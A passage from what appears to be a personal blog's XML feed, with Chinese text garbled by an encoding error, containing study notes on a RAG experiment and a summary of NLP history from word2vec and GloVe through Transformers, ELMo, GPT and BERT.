class="line">iface.launch()</span><br></pre></td></tr></table></figure><p>å°±ç”¨ibmé‚£ä½å¥³å£«è®²çš„moonçš„ä¾‹å­,é”™è¯¯ç½‘ç«™å¾—åˆ°é”™è¯¯ç­”æ¡ˆ. <img src="wrong_answer_moon.png" /></p><p>æ­£ç¡®ç½‘ç«™èƒ½å¤Ÿå¾—å‡ºæ­£ç¡®ç­”æ¡ˆ <img src="real_ans.png" /></p><p>ä¸è¿‡å…·ä½“å·¥ä½œè¿‡ç¨‹è¿˜æ˜¯ä¼šæœ‰ä¸€äº›å‡ºå…¥, è¿™é‡Œå‰é¢å¯ä»¥çœ‹åˆ°queryçš„ä¿¡æ¯å­˜åˆ°äº†vector databaseé‡Œé¢, ä¸çŸ¥é“æ˜¯ä¸æ˜¯åŒæ—¶å­˜äº†å‡ ä¸ªä¿¡æ¯å¯¼è‡´å›ç­”æ€»æ˜¯ä¸ç¨³å®š(æœ‰æ—¶å€™Jupiteræœ‰æ—¶å€™Saturn). åŒ…æ‹¬å¦‚æœä¸€æ—¦å–‚äº†bbcçš„æ–‡ç« ä¹‹å,å“ªæ€•å–‚è¿‡æ—¶çš„æ–‡ç« æ¨¡å‹è¿˜æ˜¯è¿”å›æ­£ç¡®ç­”æ¡ˆSaturn, ä¸æ’é™¤å¤šç­”æ¡ˆè¿”å›é€»è¾‘å­˜åœ¨é—®é¢˜, ä¹Ÿå¯èƒ½æ˜¯è¯­ä¹‰è¯†åˆ«åˆ°äº†æ—¶é—´å·®è·? ä¸è¿‡æ€»çš„æ¥è¯´æ˜¯ç¡®å®èƒ½å¤Ÿä»ç»™å®šæºè·å–æ–°ä¿¡æ¯, è¿™å…¶å®ä¹Ÿå°±æ˜¯Ragçš„ç›®çš„ä¹‹ä¸€äº†.</p><h1 id="ä¸€ç‚¹å°æ€è€ƒ">ä¸€ç‚¹å°æ€è€ƒ</h1><p>æœ€åç®€å•çœ‹äº†ä¸‹, å‘ç°å…¶å®llamaä¹Ÿç¡®å®å¯ä»¥åštext classification. å®˜æ–¹æ–‡æ¡£é‡Œé¢çš„: <a href="https://colab.research.google.com/drive/1ggaa2oRFphdBmqIjSEbnb_HGkcIRC2ZB?usp=sharing#scrollTo=GlxX7p6Jdcmg">A notebook on how to fine-tune the Llama 2 model with QLoRa, TRL, and Korean text classification dataset.</a>.</p><p>ä¹‹å‰çœ‹äº†BERT, chatgptç›¸å…³, äº†è§£åˆ°äº†å®ƒä»¬éƒ½æ˜¯pretrained model, å…·å¤‡å¤§é‡è¯­åº“ç›¸å…³çŸ¥è¯†. é¢„è®­ç»ƒçš„æ–¹å¼ä¹Ÿéƒ½åœ¨å‰é¢å­¦ä¹ è¿‡äº†, ä½†å¾ˆå®¹æ˜“å°±ä¼šäº§ç”Ÿä¸€ä¸ªç–‘é—®: BERTåŸºäºtransformerçš„encoderéƒ¨åˆ†, åŠ ä¸Šå…¨å±€attention, å†åŠ ä¸Šmlm, ä¼¼ä¹é‡ç‚¹æ”¾åœ¨äº†è¯­ä¹‰ç†è§£ä¸Š(å®Œå½¢å¡«ç©º+ä¸å¯å®Œå…¨ç›¸ä¿¡ç»™å‡ºçš„context,æ¨¡å‹å¿…é¡»å…·å¤‡è‡ªå·±çš„åˆ¤æ–­). ä¸ä¹‹å¯¹æ¯”, gptç”¨çš„ç›´æ¥æ˜¯decoderéƒ¨åˆ†, å®ƒçš„pretrainå…¶å®å°±æ˜¯maskæ‰åé¢çš„å¥å­å¯¹å‰é¢åšattentionç„¶ååšæ–‡æœ¬ç”Ÿæˆçš„å°è¯•, é‡ç‚¹æ”¾åœ¨äº†æ–‡æœ¬ç”Ÿæˆå±‚æ¬¡.</p><p>é‚£ä¹ˆåè¿‡æ¥å¯ä¸å¯ä»¥å‘¢? ç”¨bertåšæ–‡æœ¬ç”Ÿæˆ,ç”¨gpt-likeæ¨¡å‹åšæ–‡æœ¬åˆ†ç±»è¿™ç§æ–‡æœ¬ç†è§£é—®é¢˜æ˜¯å¦å¯è¡Œå‘¢?</p><p>åˆšå¼€å§‹æˆ‘çš„ç›´è§‰æ˜¯ä¸å¤ªåˆé€‚å§, ä¼¼ä¹è®­ç»ƒæ–¹å‘å°±ä¸å¤ªç›¸åŒ, ä½†å†ä¸€æƒ³, ä¸¤è€…éƒ½åŸºäºå¤§é‡è¯­æ–™å­¦ä¹ , æ¨¡å‹å‚æ•°éƒ½æ˜¯åƒä¸‡/äº¿çº§åˆ«çš„, å¯¹å…¶ä»–ä»»åŠ¡åšå¾®è°ƒä¹‹ååº”è¯¥ä¹Ÿå­˜åœ¨å…¼å®¹æ€§å§.</p><p>äºæ˜¯å°è¯•æ‰¾äº†ä¸€äº›èµ„æ–™. é¦–å…ˆåœ¨huggingfaceæ–‡æ¡£é‡Œæ‰¾åˆ°äº†ä¸€ä¸ª<a href="https://huggingface.co/docs/transformers/model_doc/bert-generation">bertGenerationæ¨¡å‹</a>, è¯´æ˜bertåšNLGç¡®å®æ˜¯å¯è¡Œçš„, æœ‰äººä¹Ÿåšè¿‡ç±»ä¼¼çš„äº‹æƒ….</p><p>ä¸ä¹‹ç›¸å¯¹, gpt-likeæ¨¡å‹æ˜¯å¦å¯ä»¥åšNLUç›¸å…³ä»»åŠ¡å‘¢? å…¶å®ä¹Ÿæ˜¯æœ‰çš„<a href="https://huggingface.co/docs/transformers/model_doc/gpt2#transformers.GPT2ForSequenceClassification">GPT2ForSequenceClassification</a>.</p><p>å¤§æ¦‚ä¹Ÿå°±åº”è¯äº†å‰é¢å­¦ä¹ åˆ°çš„:å¤§æ¨¡å‹å·²ç»å­¦ä¹ åˆ°äº†è¶³å¤Ÿçš„çŸ¥è¯†? éœ€è¦çš„åªæ˜¯ä¸€äº›ç‰¹å®šç›‘ç£å­¦ä¹ è®©å®ƒä»¬èƒ½å¤Ÿç”¨åˆ°æˆ‘ä»¬æ‰€éœ€æ±‚çš„åœºæ™¯?</p><p>åç»­è¿˜ä¼šç»§ç»­å­¦ä¹ ä¸€ä¸‹langchainç›¸å…³, finetuningä¹Ÿå¯ä»¥è·Ÿç€çœ‹ä¸€çœ‹. è‡³äºprompt engineeringå…¶å®ä¹Ÿæ˜¯æ—©æœ‰è€³é—», ä¸è¿‡æˆ‘è§‰å¾—ä¸äº†è§£ä¹‹å‰è¿˜æ˜¯å…ˆä¸è¯´è®¨åŒ, ç­‰çœŸæ­£äº†è§£å·¥ç¨‹æ‰€åšçš„æ˜¯ä»€ä¹ˆä¹‹åå†å»è®¨è®ºè¿™é¡¹æŠ€æœ¯æ˜¯ä¸æ˜¯çœŸçš„æœ‰æ„æ€.</p>]]></content>
      
      
      <categories>
          
          <category> ML NLP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»RNNåˆ°GPT(nlpèƒŒæ™¯å­¦ä¹ )</title>
      <link href="/2024/04/22/%E4%BB%8ERNN%E5%88%B0GPT-nlp%E8%83%8C%E6%99%AF%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/22/%E4%BB%8ERNN%E5%88%B0GPT-nlp%E8%83%8C%E6%99%AF%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©æœ¬æ¥æƒ³è¡¥ä¸€ä¸‹NLPå°¤å…¶æ˜¯GPTçš„ç›¸å…³çŸ¥è¯†,ä½†çœ‹åˆ°ä¸€ç¯‡å¾ˆå¥½çš„åšå®¢è®²äº†NLPé¢†åŸŸçš„å‘å±•,è¿™é‡Œè®°å½•ä¸€ä¸‹.</p><p><a href="https://fancyerii.github.io/2023/02/20/about-chatgpt/">å…³äºChatGPTçš„æ€è€ƒ</a>.</p><p>å†™çš„å¾ˆé•¿,ä½†æ˜¯è®²æ¸…æ¥šäº†è‡ªç„¶è¯­è¨€å¤„ç†è¿™ä¸ªé¢†åŸŸçš„æ¯ä¸ªé˜¶æ®µ,èƒ½å¤Ÿå­¦ä¹ åˆ°ä¸å°‘ä¸œè¥¿.</p><h2 id="deeplearning">DeepLearning</h2><h3 id="word-embeddingç»å†">word embeddingç»å†</h3><p>æœ€å¼€å§‹NLPä¸åŒäºå…¶ä»–å­¦ä¹ ç±»å‹,NLPçš„æ–‡æœ¬ç±»å‹æ˜¯ç¦»æ•£ç±»å‹è€Œä¸æ˜¯åƒæ•°å­—ç±»å‹ä¸€æ ·çš„è¿ç»­ç±»å‹. å¤„ç†èµ·æ¥ç¬¬ä¸€æ­¥è‚¯å®šæ˜¯ç±»å‹è½¬åŒ–,æœ€ç®€å•çš„è½¬åŒ–å³one-hot. æ¯ä¸ªæ ‡ç­¾ç®—ä¸€åˆ—,nä¸ªæ ‡ç­¾nä¸ªåˆ—.</p><p>è¿™å°±å¯¼è‡´one-hotæœ‰è‡´å‘½é—®é¢˜,æ–‡æœ¬å¦‚æœæ¶‰åŠæˆåƒä¸Šä¸‡çš„å•è¯,é‚£æˆ‘ä»¬å‡ åƒå‡ ä¸‡åˆ—çš„ç¨€ç–çŸ©é˜µ,å¤„ç†èµ·æ¥å°±å¾ˆéº»çƒ¦.</p><p>å…¶æ¬¡,åŒç§ç‰©å“æˆ–è€…å®Œå…¨ä¸åŒçš„ç‰©å“åœ¨æŸç§ç¨‹åº¦åº”è¯¥æœ‰ç›¸åŒç‚¹æˆ–åŒºåˆ†ç‚¹,è€Œåœ¨one-hoté‡Œé¢å°±åªæœ‰0æˆ–è€…1. æ¯”å¦‚çŒ«å’Œç‹—,åœ¨one-hotçš„å±‚é¢å°±æ˜¯å®Œå…¨ä¸åŒçš„ä¸œè¥¿,è€Œä¸ä¼šè€ƒè™‘éƒ½æ˜¯åŠ¨ç‰©ç±»å‹.</p><p>æ‰€ä»¥ä¸€ç§æ›´ç†æƒ³çš„å½¢å¼,ä»¥ç¨ å¯†å‘é‡æ¥è¡¨ç¤ºæŸä¸ªè¯çš„æ„ä¹‰å°±æˆä¸ºäº†æ–¹å‘. ç”±æ­¤è¡ç”Ÿå‡ºäº†ä¸€äº›å¤„ç†æ–¹å¼.</p><h4 id="latent-semantic-analysis"><u>Latent Semantic Analysis</u></h4><p>åŒ…æ‹¬occurence matrixå’ŒSVD.</p><p>occurenceå°±æ˜¯è¡Œè¡¨ç¤ºè¯,åˆ—è¡¨ç¤ºæ–‡æ¡£,æ¯ä¸ªå…ƒç´ è¡¨ç¤ºè¯å’Œæ–‡æ¡£çš„é¢‘ç‡å…³ç³»,æœ‰tf,idf,tf-idfç­‰ä¸€ç±».</p><p>SVDå³çŸ©é˜µåˆ†è§£,å°†çŸ©é˜µåˆ†è§£ä¸ºå·¦å¥‡å¼‚å‘é‡å³å¥‡å¼‚å‘é‡å’ŒåŒ…å«å¥‡å¼‚å€¼çš„å¯¹è§’çŸ©é˜µ,ä»å¯¹è§’çŸ©é˜µé‡Œé¢é€‰å–kä¸ªå¥‡å¼‚å€¼æœ€å¤§çš„å…ƒç´ åšç›¸ä¹˜ä»è€Œè¾¾åˆ°ä»nç»´é™ç»´åˆ°kç»´çš„ç›®çš„.</p><h4 id="word2vec"><u>word2vec</u></h4><p>åŒ…å«CBOWå’ŒSkip-Gram</p><p>CBOWå³ä»contexté¢„æµ‹center word, Skip-Gramä»center wordé¢„æµ‹context.</p><h4 id="glove"><u>GloVe</u></h4><p>Co-occurence + context window + decreasing weight</p><p>Co-occurenceä»è¯åº“æ„å»ºçŸ©é˜µ, context windowåšè§„å®šå¤§å°å†…ç»Ÿè®¡, decreasing weightè´Ÿè´£åœ¨context windowä¸­è·ç¦»ä¸åŒçš„æƒé‡è¡°å‡.</p><h3 id="dnn-cnn-rnn-lstm">DNN-&gt;CNN-&gt;RNN-&gt;LSTM</h3><p>æœ‰äº†word embedding,å°±å¯ä»¥ç›´æ¥ä¸¢ä¸Šnnè¿›è¡Œæœ€åˆæ­¥çš„è®­ç»ƒäº†.</p><p><strong><u>NN+CNN</u></strong>: ä¸€å¼€å§‹æ˜¯å…¨è¿å±‚, åæ¥CVé¢†åŸŸçš„CNNä¹Ÿè¿›å…¥ä½¿ç”¨(å¯ä»¥çœ‹ä½œæ˜¯åˆ©ç”¨å·ç§¯è·å–æŸç§ç¨‹åº¦çš„context windowä»è€Œè·å–ä¸Šä¸‹æ–‡).</p><p><strong><u>RNN</u></strong>: å†ä¹‹åæ˜¯RNN, RNNæ›´åŠ ä¼˜ç§€çš„ç‚¹åœ¨äºå®ƒæ¯ä¸€ä¸ªè¾“å‡ºéƒ½æ˜¯åŸºäºå‰é¢æ‰€æœ‰çš„è¾“å‡º, åç»­åºåˆ—çš„é¢„æµ‹ä¿ç•™äº†å‰é¢çš„"è®°å¿†", æ‰€ä»¥ç†è®ºæ¥è®²RNNå¯ä»¥è®­ç»ƒä»»æ„é•¿åº¦åºåˆ—.</p><p><strong><u>LSTM, GRU</u></strong>: å†ä¹‹åæ˜¯LSTMå’ŒGRU, è§£å†³çš„æ˜¯RNNä¸­æ¢¯åº¦æ¶ˆå¤±çš„é—®é¢˜. æ¯”å¦‚LSTMå°±æ˜¯é€šè¿‡é—¨æ§å¯¹RNNåŠ ä¸ŠçŸ­æœŸè®°å¿†çš„æ”¯æŒå’Œé•¿æœŸè®°å¿†çš„é€‰æ‹©é—å¿˜ä»è€Œè§£å†³RNNé•¿åº¦è¿‡é•¿çš„æ—¶å€™ä¼šé—å¿˜è¿‡å»ä¿¡æ¯çš„é—®é¢˜, è€ŒGRUæ˜¯é—¨æ§ç®€åŒ–çš„LSTM.</p><h3 id="seq2seq-attention">Seq2Seq &amp; Attention</h3><p><strong>Seq2Seq</strong>è§£å†³çš„é—®é¢˜æ˜¯<strong>æ–‡æœ¬ç¿»è¯‘</strong>æˆ–è€…<strong>ä»æ–‡æœ¬ç”Ÿæˆæ–‡æœ¬</strong>çš„é—®é¢˜, å…·ä½“åšæ³•å°±æ˜¯inputä¸¢åˆ°encoderå°†è¾“å…¥ç¼–ç æˆä¸€ä¸ªlatent vectorç„¶åå†ç”±decoderå¯¹lantent vectorè¿›è¡Œè¿˜åŸ.</p><p><strong>Attention</strong>: ç„¶è€ŒæŠŠæ•´ä¸ªé•¿å¥å…¨éƒ¨ç¼–ç åˆ°ä¸€ä¸ªlatent vectoræ˜¯å›°éš¾çš„, æ‰€ä»¥è¿™é‡Œå¼•å…¥äº†attention. å³decoderå¯¹latent vectorè¿›è¡Œè§£ç çš„æ—¶å€™ä¼šå—åˆ°encoderä¸­æ‰€æœ‰æ­¥éª¤çš„ä¿¡æ¯-å³æ³¨æ„åŠ›æƒé‡çš„å½±å“, ä»è€ŒdecoderçŸ¥é“å“ªä¸ªæ­¥éª¤æˆ‘éœ€è¦ç€é‡å…³æ³¨è€Œå“ªäº›è¯æ— å…³ç´§è¦.</p><ul><li>åœ¨Encoder-Decoderæ¡†æ¶ä¸‹ï¼ŒDecoderåœ¨è§£ç çš„æ—¶å€™ä¼šâ€œæ³¨æ„â€åˆ°Encoderçš„éšçŠ¶æ€åºåˆ—ï¼Œä»è€Œåˆ©ç”¨è¿™äº›ä¿¡æ¯æ›´å¥½çš„è§£ç ã€‚</li><li>Encoderä¼šæŠŠæ¯ä¸€ä¸ªè¾“å…¥çš„Token(å¯ä»¥ç†è§£ä¸ºè¯)éƒ½ç¼–ç æˆä¸€ä¸ªå‘é‡ï¼Œåœ¨Decoderè¿›è¡Œtæ—¶åˆ»è®¡ç®—çš„æ—¶å€™ï¼Œé™¤äº†t-1æ—¶åˆ»çš„éšçŠ¶æ€å’Œå½“å‰æ—¶åˆ»çš„è¾“å…¥ï¼Œæ³¨æ„åŠ›æœºåˆ¶è¿˜å¯ä»¥å‚è€ƒEncoderæ‰€æœ‰æ—¶åˆ»çš„è¾“å…¥ã€‚æ¯”å¦‚ä¸Šé¢è¾“å…¥æ˜¯"æ¬¢è¿ æ¥ åŒ—äº¬"ï¼Œé‚£ä¹ˆåœ¨ç¿»è¯‘ç¬¬ä¸€ä¸ªè¯çš„æ³¨æ„åŠ›å¯èƒ½æ˜¯è¿™æ ·: (0.7,0.2,0.1)ï¼Œè¡¨ç¤ºå½“å‰æœ€å…³æ³¨çš„æ˜¯è¾“å…¥çš„ç¬¬ä¸€ä¸ªè¯ï¼Œä½†æ˜¯ä¹Ÿä¼šå‚è€ƒå…¶å®ƒçš„è¯ã€‚å‡è®¾Encoderçš„3ä¸ªè¾“å‡ºåˆ†åˆ«æ˜¯ğ‘¦1,ğ‘¦2,ğ‘¦3ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨attentionæ¦‚ç‡åŠ æƒå¾—åˆ°å½“å‰æ—¶åˆ»çš„contextå‘é‡0.7*ğ‘¦1 + 0.2*ğ‘¦2 + 0.1*ğ‘¦3.</li></ul><h2 id="è¿‘ä»£deep-learning">è¿‘ä»£Deep Learning</h2><h3 id="transformer">Transformer</h3><p>LSTMæ­é…Attentionæ¥å¤„ç†Seq2Seqç›¸å…³é—®é¢˜æµè¡Œäº†èµ·æ¥, ä½†æ˜¯RNNåº•å±‚é€»è¾‘è¿˜æ˜¯æœ‰é—®é¢˜:</p><ol type="1"><li>RNNä¸‹ä¸€æ­¥å»ºç«‹åœ¨ä¸Šä¸€æ­¥è®¡ç®—ä¸Š,æ‰€ä»¥æ— æ³•å¹¶è¡Œ</li><li>å½“å‰RNNä»…å•å‘, å¦‚æœæ–‡æœ¬é‡Œé¢çš„contextåœ¨å½“å‰æ—¶é—´tä¹‹å, é‚£ä¹ˆæ¨¡å‹å°±æ— æ³•è·å¾—ä¿¡æ¯.</li></ol><p><img src="animal_street.png" /></p><h4 id="self-attention">Self-Attention</h4><p>Transformerä¹Ÿæ˜¯æ¥è‡ªè‘—åè®ºæ–‡<a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a>, è¯¥è®ºæ–‡æå‡ºäº†ä½¿ç”¨SelfAttentionæ¥å–ä»£ä¼ ç»ŸLSTMå’ŒGRU.</p><p>åœ¨Encoder-Decoderæ¡†æ¶ä¸‹ï¼ŒDecoderåœ¨è§£ç çš„æ—¶å€™ä¼šâ€œæ³¨æ„â€åˆ°Encoderçš„éšçŠ¶æ€åºåˆ—ï¼Œä»è€Œåˆ©ç”¨è¿™äº›ä¿¡æ¯æ›´å¥½çš„è§£ç .</p><p>åœ¨Transformerä¸­, SelfAttentionåˆ©ç”¨æ•´ä¸ªåºåˆ—çš„embeddingæ¥è®¡ç®—å½“å‰tokençš„embedding, å³æ¯ä¸€ä¸ªæ–°çš„embeddingéƒ½ä¼šåŒ…å«æœ‰æ•´ä¸ªåºåˆ—çš„ä¿¡æ¯.</p><p><span class="math display">\[ x_iâ€™=\sum_{j=1}^{n}w_{ji}x_j \]</span></p><h3 id="æ’æ›²">æ’æ›²</h3><p><a href="https://fancyerii.github.io/2023/02/20/about-chatgpt/#%E5%BD%93%E6%97%B6%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98">å½“æ—¶å­˜åœ¨çš„é—®é¢˜</a></p><p>ä½œè€…è¿™é‡ŒæŒ‡å‡ºå½“æ—¶è‡ªç„¶è¯­è¨€å¤„ç†é¢†åŸŸç¼ºå°‘å•ä»»åŠ¡è®­ç»ƒæ•°æ®,å¯¼è‡´è§£å†³ä¸€ä¸ªé—®é¢˜å¯èƒ½è¿˜ä¼šè¿å¸¦è§£å†³å¾ˆå¤šä¸­é—´é—®é¢˜. ä½œè€…è¡¨ç¤ºè¿™æ˜¯æŠ€æœ¯å‘å±•ä¸å¤Ÿçš„ä¸€ç§è¡¨ç°, å¹¶ä¸”æ­£æ˜¯ç”±äºæˆ‘ä»¬æ²¡æœ‰å¯¹ä¸“ä¸€ä»»åŠ¡çš„æ•°æ®é›†, æœ€å¥½çš„è§£å†³æ–¹æ¡ˆæ˜¯èƒ½å¤Ÿè®©æ¨¡å‹ä»æ— æ ‡æ³¨çš„æ–‡æœ¬ä¸­å­¦ä¹ .</p><p>ç¡®å®æ˜¯æ­£ç¡®çš„æ€è€ƒæ–¹å¼,ä¸è¿‡å½“æ—¶æˆ‘å¯èƒ½è¿numpyéƒ½æ²¡ç”¨è¿‡,å°±åªèƒ½ä½“ä¼šä¸€ä¸‹å½“æ—¶çš„èƒŒæ™¯äº†.</p><h3 id="elmo">ELMo</h3><p><a href="https://arxiv.org/abs/1802.05365">Deep contextualized word representations</a>, ç»™äººç›´è§‚æ„Ÿè§‰å°±æ˜¯è§£å†³word vectorå±‚é¢çš„é—®é¢˜. å…¶èƒ½å¤ŸåŸºäºä¸Šä¸‹æ–‡æ¥ä»æ— æ ‡æ³¨çš„æ–‡æœ¬ä¸­å­¦ä¹ ç›¸å…³Embedding(è§£å†³äº†å‰é¢æåˆ°çš„æ•°æ®ç¨€å°‘é—®é¢˜), å¹¶ä¸”èƒ½å¤ŸåŠ¨æ€ç”Ÿæˆè¯å‘é‡ä¾›æ¨¡å‹ä½¿ç”¨.</p><p>ä»¥å‰çš„word embeddingä¸»è¦ä¸ºäº†è§£å†³ä¸¤ä¸ªé—®é¢˜.</p><ol type="1"><li>è¯­æ³•è¯­ä¹‰, æŸè¯è¡¨ç¤ºä»€ä¹ˆæ„æ€, æœ‰ä»€ä¹ˆç‰¹ç‚¹.</li><li>ä¸åŒåœºåˆçš„åŒè¯ä½¿ç”¨.</li></ol><p>word2vecå’ŒGloVeè§£å†³äº†ç¬¬ä¸€ä¸ªé—®é¢˜,èƒ½å¤Ÿç”¨å‘é‡è¡¨ç¤ºæŸäº›è¯çš„æ„æ€,ä½†æ˜¯ä¾ç„¶å­˜åœ¨åŒè¯ä¸åŒåœºæ™¯çš„ä½¿ç”¨æƒ…æ™¯. ç»å…¸çš„bankå¯ä»¥æŒ‡é“¶è¡Œä¹Ÿå¯ä»¥æ˜¯æ°´å. ä½†æ˜¯å®ƒä»¬é’ˆå¯¹åŒä¸€ä¸ªç¡®å®štokençš„word vectorå´æ€»æ˜¯ç›¸åŒçš„.</p><p>ELMoåšå‡ºäº†ä¸¤æ–¹é¢è´¡çŒ®</p><ol type="1"><li>åŒå‘è®­ç»ƒ, ä»å‰å¾€åè®­ç»ƒä»¥åŠä»åå¾€å‰è®­ç»ƒ, ä»è€Œæ­¤tokenå¯ä»¥è·å¾—æ•´ä¸ªå…¨æ–‡çš„ä¿¡æ¯è€Œä¸è‡³äºä»å‰å¾€åçš„æ—¶å€™æ€»æ˜¯æœªçŸ¥åç»­ä¿¡æ¯.</li><li>åŠ¨æ€embedding</li></ol><p>ç¬¬ä¸€ç‚¹å®¹æ˜“ç†è§£, åœ¨base modelä¸ºLSTMçš„æƒ…å†µä¸‹, å•å‘è®­ç»ƒç¡®å®ä¼šç¼ºå°‘å¤§äºtæ—¶é—´çš„ä¿¡æ¯, åŒå‘è®­ç»ƒè·å–å…¨æ–‡ä¿¡æ¯ä¹Ÿå°±å®¹æ˜“ç†è§£.</p><p>ç¬¬äºŒç‚¹çš„åŠ¨æ€embeddingå®ç°å°±æ¯”è¾ƒå·§å¦™äº†, tokenæœ¬èº«ä»GloVeæˆ–è€…word2vecå°±ç”Ÿæˆäº†è‡ªå·±çš„embedding, é‚£æˆ‘ä»¬åœ¨é’ˆå¯¹æŸä¸ªè¯ä¹‹å‰å°±ç”¨ä¸€ä¸ªå…¨è¿å±‚è¿æ¥åŸå§‹çš„embeddingå’Œæ–°äº§ç”Ÿçš„context, ä»è€Œæ•´åˆcontextä¿¡æ¯å’ŒåŸå§‹è¯ä¹‰è¾¾åˆ°åŠ¨æ€embeddingçš„æ•ˆæœ.</p><p>å½“ç„¶ELMoåªæ˜¯ä¸€ä¸ªä¸Šæ¸¸ä»»åŠ¡, åç»­å…·ä½“ä»»åŠ¡å¯ä»¥ç›´æ¥æ­åœ¨ELMoçš„åŸºç¡€ä¹‹ä¸Š.</p><h3 id="gpt">GPT</h3><p>Generative Pre-trained Transformer. å…¶æ€æƒ³ç›¸å½“äºæ˜¯ä½¿ç”¨transformerçš„decoderç›´æ¥è¿›è¡Œæ–‡æœ¬çš„ç”Ÿæˆ, æœ€åä¾æ®å…·ä½“ä»»åŠ¡å¯¹transformerè¿›è¡Œfinetuning.</p><h4 id="pretraining">Pretraining</h4><p>Pretrainingå³è®­ç»ƒæ¨¡å‹ä½¿ç”¨transformerçš„decoderç›´æ¥è¿›è¡Œæ–‡æœ¬çš„ç”Ÿæˆ.</p><p>ä½†æ˜¯è¿™é‡Œå­˜åœ¨é—®é¢˜, transformerçš„decoderé‡Œé¢ç”¨åˆ°äº†å…¨å±€self attention, å…¶åŒ…å«äº†å‰åæ–‡æ‰€æœ‰ä¿¡æ¯, å¦‚æœæˆ‘ä»¬é¢„å…ˆçŸ¥é“äº†å…¨æ–‡ä¿¡æ¯é‚£é¢„æµ‹å°±æ˜¯ç›¸å½“äºä½œå¼Š, å› æ­¤åœ¨è®­ç»ƒçš„æ—¶å€™æˆ‘ä»¬ä¼šå¯¹åç»­è¾“å…¥è¿›è¡Œmask, å³ä¸‹ä¸€å­—ç¬¦çš„ç”Ÿæˆä»…ä»…å’Œå‰é¢çš„å­—ç¬¦ç›¸å…³.</p><p>å³ä½¿ç”¨çš„æ˜¯Masked Self Attention.</p><h4 id="ç›‘ç£çš„fine-tuning">ç›‘ç£çš„Fine-Tuning</h4><p>æ— ç›‘ç£çš„Pretrainingä¹‹åï¼Œæˆ‘ä»¬å†å»é’ˆå¯¹ç‰¹å®šä»»åŠ¡è¿›è¡ŒFine-Tuning.</p><h3 id="bert">BERT</h3><p><a href="https://arxiv.org/abs/1810.04805">BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding</a> å…¨ç§°Bidirectional Encoder Representations from Transformers, å³åŒå‘çš„transformer encoderæ¨¡å‹.</p><p>åœ¨transformerçš„åŸºç¡€ä¹‹ä¸Š, å³å¾€å‰çœ‹ä¹Ÿå¾€åçœ‹, æ•´åˆæ•´ä¸ªå¥å­çš„context information.</p><p>ç„¶åå°±æ˜¯å’ŒGPTåŒæ ·çš„é—®é¢˜, å¦‚æœæˆ‘ä»¬å·²ç»å…·å¤‡äº†å…¨æ–‡çŸ¥è¯†, é‚£ä¹ˆæˆ‘ä»¬çš„è®­ç»ƒå…¶å®æ˜¯åœ¨ä½œå¼Š. åŒæ ·BERTä¹Ÿä½¿ç”¨äº†mask.</p><p>ä¸¾ä¸ªä¾‹å­, ä¸€ä¸ªå¥å­é‡Œé¢æˆ‘ä»¬maskæ‰15%çš„token, é‚£ä¹ˆä¸€æ—¦ä¸€ä¸ªtokenè½åœ¨è¿™15%ä¸­, æˆ‘ä»¬å¯ä»¥é€‰æ‹©æ›¿æ¢æˆ&lt;mask&gt;, æˆ–è€…æ›¿æ¢æˆå…¶ä»–token,åˆæˆ–è€…ä¿æŒåŸæœ‰token, ç„¶åè®©æ¨¡å‹å»è®­ç»ƒ. æ­¤è¿‡ç¨‹å³è®­ç»ƒæ¨¡å‹å¹¶ä¸èƒ½å¤ªè¿‡ä¾èµ–è¯æœ¬èº«è€Œæ˜¯è¦è€ƒè™‘ä¸Šä¸‹æ–‡.</p><p>é™¤æ­¤ä¹‹å¤–,BERTè¿˜ä¼šå¯¹åºåˆ—åšSegmentçš„åŒºåˆ†, ä»è€Œåˆ¤æ–­ä¸¤ä¸ªå¥å­æ˜¯å¦æ˜¯ç›¸è¿çš„, ç”šè‡³å¯ä»¥åç»­ç”¨æ¥åšé—®ç­”ä½¿ç”¨.</p><h3 id="gpt2-åŠä»¥å">GPT2 åŠä»¥å</h3><p>è¿™éƒ¨åˆ†å†…å®¹æŒºå¤šçš„,è¿‘æœŸå¯ä»¥æŠŠåŸè®ºæ–‡è¯»ä¸€è¯»ç„¶åå†å›å¤´æ¥çœ‹,æ¯•ç«Ÿä¸çœ‹è®ºæ–‡æ€»æ„Ÿè§‰å°‘ç‚¹æ„æ€.</p><p>ä¸è¿‡NLPçš„å‘å±•ä¹‹è·¯ä¹ŸæŒºæœ‰æ„æ€çš„, åœ¨æ­¤è®°å½•ä¸€ä¸‹, æ„Ÿè°¢<a href="https://fancyerii.github.io/">æç†</a>çš„ç²¾å½©è®°å½•, å—ç›ŠåŒªæµ….</p><blockquote><p>https://fancyerii.github.io/2023/02/20/about-chatgpt<br />https://blog.csdn.net/qq_43689179/article/details/98478617<br />https://blog.csdn.net/qq_45848817/article/details/136889730<br />https://www.fanyeong.com/2018/02/19/glove-in-detail/<br />https://github.com/datawhalechina/learn-nlp-with-transformers/blob/main/docs/ç¯‡ç« 2-Transformerç›¸å…³åŸç†/2.4-å›¾è§£GPT.md</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ML NLP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Diffuserså­¦ä¹ (2)-LoRA</title>
      <link href="/2024/04/22/Diffusers%E5%AD%A6%E4%B9%A0-2-LoRA/"/>
      <url>/2024/04/22/Diffusers%E5%AD%A6%E4%B9%A0-2-LoRA/</url>
      
